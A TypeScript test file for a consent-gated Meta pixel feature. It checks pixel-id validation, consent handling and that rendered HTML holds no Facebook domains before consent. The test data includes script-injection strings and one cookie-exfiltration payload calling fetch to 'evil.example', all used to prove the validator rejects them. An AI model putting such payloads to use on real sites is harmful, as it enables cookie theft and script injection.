// THE RULES, AND THE ONE CLAIM THAT HAS TO BE MADE ABOUT BYTES.
//
// Most of this file tests pure functions against themselves. The block at the end
// does something different and is the reason the file exists at all: it RENDERS
// the public component and asserts on the HTML, because "without consent the page
// makes no request to a Facebook domain" is a claim about output, and a claim
// about output that is only argued for in a comment is a claim that survives the
// refactor that breaks it.

import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import {
  MAX_PIXEL_ID_LENGTH,
  META_CONSENT_STORAGE_KEY,
  META_PIXEL_HOST,
  META_PIXEL_OFF,
  consentGrantsPixel,
  describePixelConfigFailures,
  isPixelId,
  metaPixelConfig,
  metaPixelScript,
  normalisePixelId,
  parseConsentDecision,
  publicMetaPixelId,
  shouldAskConsent,
  validatePixelConfig,
} from "./meta-pixel";
import { MetaConsentPrompt, MetaPixel } from "@/components/assess/meta-pixel";

const REAL_ID = "123456789012345"; // 15 digits, the shape Meta issues

/* ---------------------------------------------------------------------------
 * 1. The pixel id: the grammar that is also the injection guard.
 * ------------------------------------------------------------------------- */

describe("a pixel id is digits, and nothing else is one", () => {
  it("accepts a real id and trims a pasted one", () => {
    expect(normalisePixelId(REAL_ID)).toBe(REAL_ID);
    expect(normalisePixelId(`  ${REAL_ID}\n`)).toBe(REAL_ID);
    expect(isPixelId(REAL_ID)).toBe(true);
  });

  // MUTATION: relax the anchors to /[0-9]{8,20}/ (unanchored) and every string
  // below that CONTAINS digits becomes an id — including the script payloads.
  // This value is interpolated into a <script> body on a public page, so the
  // grammar is not validation, it is the whole defence.
  it.each([
    ["", "empty"],
    ["   ", "whitespace"],
    ["12345", "too short"],
    ["1".repeat(21), "too long"],
    ["123 456 789 012", "separators (a typo, never silently joined)"],
    ["123-456-789-012", "hyphens"],
    ["+123456789012345", "a leading sign"],
    ["12345678901234a", "a stray letter"],
    ["1');alert(1);('", "a script payload"],
    ["1');fetch('https://evil.example/'+document.cookie);('", "an exfiltration payload"],
    ["</script><script>alert(1)</script>", "a tag break-out"],
    ["${REAL_ID}", "a template expression"],
  ])("refuses %s (%s)", (value) => {
    expect(normalisePixelId(value)).toBe(null);
    expect(isPixelId(value)).toBe(false);
  });

  it("refuses anything that is not a string at all", () => {
    for (const value of [null, undefined, 123456789012345, {}, [], true]) {
      expect(normalisePixelId(value)).toBe(null);
    }
  });
});

/* ---------------------------------------------------------------------------
 * 2. The config: three doors into "off".
 * ------------------------------------------------------------------------- */

describe("anything unclear collapses to no tracking at all", () => {
  it("is off for no row, an empty row, and a row that never said yes", () => {
    expect(metaPixelConfig(null)).toEqual(META_PIXEL_OFF);
    expect(metaPixelConfig(undefined)).toEqual(META_PIXEL_OFF);
    expect(metaPixelConfig({})).toEqual(META_PIXEL_OFF);
    expect(metaPixelConfig({ enabled: false, pixelId: REAL_ID })).toEqual(META_PIXEL_OFF);
    expect(metaPixelConfig({ enabled: null, pixelId: REAL_ID })).toEqual(META_PIXEL_OFF);
  });

  // MUTATION: accept a truthy `enabled` instead of `=== true`, and a row holding
  // the string "false" (a hand edit, a CSV import) switches tracking ON.
  it("requires enabled to be exactly true", () => {
    const sneaky = { enabled: "true", pixelId: REAL_ID } as unknown as Parameters<
      typeof metaPixelConfig
    >[0];
    expect(metaPixelConfig(sneaky)).toEqual(META_PIXEL_OFF);
  });

  // MUTATION: trust the id from the write path. The write path is not the only
  // way a row changes -- and this value's next stop is executable code.
  it("re-validates the id on the way OUT, so a hand-edited row cannot go live", () => {
    expect(metaPixelConfig({ enabled: true, pixelId: "not-an-id" })).toEqual(META_PIXEL_OFF);
    expect(metaPixelConfig({ enabled: true, pixelId: null })).toEqual(META_PIXEL_OFF);
    expect(metaPixelConfig({ enabled: true, pixelId: "1');alert(1);('" })).toEqual(META_PIXEL_OFF);
  });

  it("enabled implies a real id, by construction (there is no half state)", () => {
    const on = metaPixelConfig({ enabled: true, pixelId: REAL_ID, advancedMatching: true });
    expect(on).toEqual({ enabled: true, pixelId: REAL_ID, advancedMatching: true });
    // The property every downstream reader rests on.
    for (const fields of [
      { enabled: true, pixelId: REAL_ID },
      { enabled: true, pixelId: "junk" },
      { enabled: false, pixelId: REAL_ID },
      {},
    ]) {
      const config = metaPixelConfig(fields);
      if (config.enabled) expect(config.pixelId).not.toBe(null);
    }
  });

  it("advanced matching is off unless it is exactly true, and is meaningless when off", () => {
    expect(metaPixelConfig({ enabled: true, pixelId: REAL_ID }).advancedMatching).toBe(false);
    expect(
      metaPixelConfig({ enabled: true, pixelId: REAL_ID, advancedMatching: null }).advancedMatching,
    ).toBe(false);
    // Stored true on a switched-off practice is inert data, not a pending state.
    expect(metaPixelConfig({ enabled: false, advancedMatching: true })).toEqual(META_PIXEL_OFF);
  });

  it("the off constant is frozen, so one caller cannot re-configure every practice", () => {
    expect(Object.isFrozen(META_PIXEL_OFF)).toBe(true);
  });
});

describe("the browser is told a pixel id and nothing else", () => {
  // MUTATION: return the whole config and `advancedMatching` -- the switch that
  // decides whether a patient's hashed details leave the server -- becomes a
  // field in the page's serialised props for anyone to read.
  it("projects to one string", () => {
    expect(publicMetaPixelId(metaPixelConfig({ enabled: true, pixelId: REAL_ID }))).toBe(REAL_ID);
    expect(publicMetaPixelId(META_PIXEL_OFF)).toBe(null);
    expect(publicMetaPixelId({ enabled: false, pixelId: REAL_ID, advancedMatching: true })).toBe(
      null,
    );
  });
});

/* ---------------------------------------------------------------------------
 * 3. The decision.
 * ------------------------------------------------------------------------- */

describe("only an explicit yes is a yes", () => {
  it("parses the two values it wrote, and nothing else", () => {
    expect(parseConsentDecision("granted")).toBe("granted");
    expect(parseConsentDecision("denied")).toBe("denied");
  });

  // MUTATION: parse anything non-empty as granted. A corrupted key, a value from
  // a future version, or a string typed into devtools would then load the pixel.
  // Unrecognised must mean "ask again", which is the direction that cannot leak.
  it.each([null, undefined, "", "true", "yes", "GRANTED", "1", 1, {}])(
    "treats %s as not decided",
    (raw) => {
      expect(parseConsentDecision(raw)).toBe(null);
      expect(consentGrantsPixel(parseConsentDecision(raw))).toBe(false);
    },
  );

  it("asks only when there is something to ask about, and only once", () => {
    expect(shouldAskConsent(REAL_ID, "undecided")).toBe(true);
    // No pixel configured => no banner. A consent prompt for tracking a site does
    // not do is the commonest dark pattern on the web and an outright lie.
    expect(shouldAskConsent(null, "undecided")).toBe(false);
    // Decided, either way, ends it.
    expect(shouldAskConsent(REAL_ID, "granted")).toBe(false);
    expect(shouldAskConsent(REAL_ID, "denied")).toBe(false);
  });

  // MUTATION: treat "unknown" as "undecided" — one word, and the banner is in the
  // server's HTML for every visitor, including the one who declined last week and
  // now watches it flash past on every page.
  it('never asks on "unknown", which is what the server and a pre-read browser say', () => {
    expect(shouldAskConsent(REAL_ID, "unknown")).toBe(false);
    expect(shouldAskConsent(null, "unknown")).toBe(false);
    // ...and "unknown" is certainly not a grant.
    expect(consentGrantsPixel("unknown")).toBe(false);
    expect(consentGrantsPixel("undecided")).toBe(false);
    expect(consentGrantsPixel("granted")).toBe(true);
  });

  it("keeps the storage key stable, because changing it re-asks everyone", () => {
    // A rename would silently discard every refusal already recorded on every
    // device -- which is the one change here that looks harmless and is not.
    expect(META_CONSENT_STORAGE_KEY).toBe("assess:meta-consent");
  });
});

/* ---------------------------------------------------------------------------
 * 4. The snippet.
 * ------------------------------------------------------------------------- */

describe("the snippet is built only from digits", () => {
  it("initialises the configured pixel and fires one PageView", () => {
    const code = metaPixelScript(REAL_ID);
    expect(code).toContain(`fbq('init','${REAL_ID}')`);
    expect(code).toContain("fbq('track','PageView')");
    expect(code).toContain(`https://${META_PIXEL_HOST}/en_US/fbevents.js`);
  });

  // MUTATION: drop the re-validation and build the snippet from whatever arrived.
  // This is the LAST function before a string becomes executable code on a public
  // page, so it re-asks rather than trusting its caller.
  it.each(["", "not-an-id", "1');alert(1);('", "</script><script>alert(1)</script>"])(
    "returns null rather than a snippet for %s",
    (value) => {
      expect(metaPixelScript(value)).toBe(null);
    },
  );

  it("has no <noscript> image fallback, deliberately", () => {
    // Meta's install guide pairs the script with an <img>. An <img> in markup
    // fires when the HTML is parsed, with no way to gate it on a click -- so the
    // one visitor it serves is the one who could never have consented.
    const code = metaPixelScript(REAL_ID) ?? "";
    expect(code).not.toContain("noscript");
    expect(code).not.toContain("<img");
    expect(code).not.toContain("/tr?id=");
  });
});

/* ---------------------------------------------------------------------------
 * 5. The write gate.
 * ------------------------------------------------------------------------- */

describe("the settings gate", () => {
  it("switching off always succeeds, whatever is in the id box", () => {
    // MUTATION: validate the id before the enabled check, and the stop button
    // argues with you when the thing you are stopping is a half-typed field.
    const result = validatePixelConfig({ enabled: false, pixelId: "half-typed" });
    expect(result).toEqual({ ok: true, config: META_PIXEL_OFF });
  });

  it("refuses a switch-on with no usable id, and says what an id is", () => {
    const empty = validatePixelConfig({ enabled: true, pixelId: "" });
    expect(empty.ok).toBe(false);
    if (!empty.ok) {
      expect(describePixelConfigFailures(empty.failures)).toContain("Events Manager");
    }
    const junk = validatePixelConfig({ enabled: true, pixelId: "abc" });
    expect(junk.ok).toBe(false);
    if (!junk.ok) {
      const text = describePixelConfigFailures(junk.failures);
      expect(text).toContain('"abc"');
      expect(text).toContain(String(MAX_PIXEL_ID_LENGTH));
    }
  });

  // MUTATION: silently drop orphaned advanced matching instead of refusing it.
  // The form then shows a tick that means nothing today and means something the
  // day somebody else switches tracking on.
  it("refuses advanced matching on a practice with tracking off", () => {
    const result = validatePixelConfig({ enabled: false, advancedMatching: true });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.failures[0].kind).toBe("orphan-matching");
  });

  it("stores the validated config, never the caller's shape", () => {
    const result = validatePixelConfig({
      enabled: true,
      pixelId: ` ${REAL_ID} `,
      advancedMatching: true,
      somethingElse: "ignored",
    });
    expect(result).toEqual({
      ok: true,
      config: { enabled: true, pixelId: REAL_ID, advancedMatching: true },
    });
  });

  it("treats a non-object body as switching everything off, not as a crash", () => {
    for (const body of [null, undefined, "x", 7, []]) {
      expect(validatePixelConfig(body)).toEqual({ ok: true, config: META_PIXEL_OFF });
    }
  });
});

/* ---------------------------------------------------------------------------
 * 6. THE BYTES. The claim this whole feature stands on.
 * ------------------------------------------------------------------------- */

/**
 * The word "Facebook" is ALLOWED in the prompt's copy and the domains are not.
 *
 * That distinction is the point: naming the company is a consent requirement (a
 * visitor cannot agree to an unnamed third party), while a domain in the markup is
 * a request the browser makes on its own. So the assertions below look for hosts,
 * script tags and the pixel's function name -- never for the brand.
 */
const FORBIDDEN_IN_MARKUP = [
  "connect.facebook.net",
  "graph.facebook.com",
  "facebook.net",
  "fbevents",
  "fbq(",
  "<script",
];

function assertNoMetaBytes(label: string, html: string): void {
  for (const needle of FORBIDDEN_IN_MARKUP) {
    expect(html.includes(needle), `${label} put "${needle}" into the markup`).toBe(false);
  }
}

describe("the rendered page carries no Facebook domain without consent", () => {
  // MUTATION: render the snippet as <script dangerouslySetInnerHTML> (the obvious
  // implementation, and the one every tutorial shows). The HTML then carries
  // connect.facebook.net for EVERY visitor, before anybody has clicked anything,
  // and the consent gate becomes decoration. Both cases below would fail.
  it("renders literally nothing when the practice has no pixel", () => {
    const html = renderToStaticMarkup(createElement(MetaPixel, { pixelId: null }));
    expect(html).toBe("");
    assertNoMetaBytes("an unconfigured practice", html);
  });

  it("renders no Meta bytes when a pixel IS configured but nobody has consented", () => {
    // The SERVER's snapshot is "unknown", so this is also the assertion that the
    // banner itself is not server-rendered: it is a question about one browser,
    // and only that browser can say whether it has already been answered.
    const html = renderToStaticMarkup(createElement(MetaPixel, { pixelId: REAL_ID }));
    expect(html).toBe("");
    assertNoMetaBytes("a configured practice with no decision", html);
    // ...and the id itself is not sitting in the server's HTML either: the pixel
    // is inserted from the client after a grant, so the markup does not need it.
    expect(html).not.toContain(REAL_ID);
  });

  it("the prompt itself is markup only: no script, no domain, no id", () => {
    const html = renderToStaticMarkup(
      createElement(MetaConsentPrompt, { onAccept: () => {}, onDecline: () => {} }),
    );
    assertNoMetaBytes("the consent prompt", html);
    // It does say who is being asked about and what happens, which is what makes
    // the consent informed rather than a shrug.
    expect(html).toContain("Meta");
    expect(html).toContain("Facebook and Instagram");
    expect(html).toContain("cookies");
    // Two real buttons, and a refusal that is a button rather than a grey link.
    expect(html.match(/<button/g) ?? []).toHaveLength(2);
    expect(html).toContain("No thanks");
  });
});

describe("the feature sets no cookie of its own, anywhere", () => {
  // MUTATION: record the decision in document.cookie "because that is what cookie
  // banners do". A page that has just asked "may we set cookies?" must not answer
  // its own question while the visitor is still reading it.
  const SOURCES = [
    "src/lib/assess/meta-pixel.ts",
    "src/lib/assess/meta-pixel-consent.ts",
    "src/components/assess/meta-pixel.tsx",
  ];

  /**
   * Source with comments stripped: what a file DOES, not what it explains. The
   * same helper custom-theme-wiring.test.ts uses, and it is needed here for a
   * pointed reason -- these files DISCUSS document.cookie (one holds an
   * exfiltration payload as an example of what the grammar refuses; another
   * explains why no cookie is set). A raw text search would fail on the very
   * comments that document the rule.
   */
  function codeOnly(source: string): string {
    return source
      .replace(/\/\*[\s\S]*?\*\//g, "")
      .replace(/^\s*\/\/.*$/gm, "")
      .replace(/\{\/\*[\s\S]*?\*\/\}/g, "");
  }

  function code(path: string): string {
    return codeOnly(readFileSync(resolve(process.cwd(), path), "utf8"));
  }

  it.each(SOURCES)("%s never touches document.cookie", (path) => {
    expect(code(path)).not.toContain("document.cookie");
  });

  it("the public component reaches storage only through the named helpers", () => {
    // The component holds the decision; it must not learn to write one itself.
    const src = code("src/components/assess/meta-pixel.tsx");
    expect(src).not.toContain("localStorage");
    expect(src).not.toContain("sessionStorage");
    expect(src).toContain('recordMetaConsent("granted")');
    expect(src).toContain('recordMetaConsent("denied")');
  });

  it("storage is written from exactly one place, and it is a click handler", () => {
    // MUTATION: call recordMetaConsent from the mount effect "to remember that we
    // asked". The banner would then store something on a device whose visitor has
    // not chosen -- which is the one act this whole design forbids.
    const consent = code("src/lib/assess/meta-pixel-consent.ts");
    expect(consent.match(/setItem\(/g) ?? []).toHaveLength(1);
    const component = code("src/components/assess/meta-pixel.tsx");
    // Exactly two: the accept handler and the decline handler, and nowhere else.
    expect(component.match(/recordMetaConsent\(/g) ?? []).toHaveLength(2);
    // Both sit on the prompt's own props, so the only way to reach either is a
    // click. Neither is inside an effect.
    expect(component).toContain('onAccept={() => recordMetaConsent("granted")}');
    expect(component).toContain('onDecline={() => recordMetaConsent("denied")}');
    const effectAt = component.indexOf("useEffect(");
    const promptAt = component.indexOf("<MetaConsentPrompt");
    expect(effectAt).toBeGreaterThan(-1);
    expect(effectAt).toBeLessThan(promptAt);
    expect(component.slice(effectAt, component.indexOf("}, [pixelId, snapshot]);"))).not.toContain(
      "recordMetaConsent",
    );
  });
});
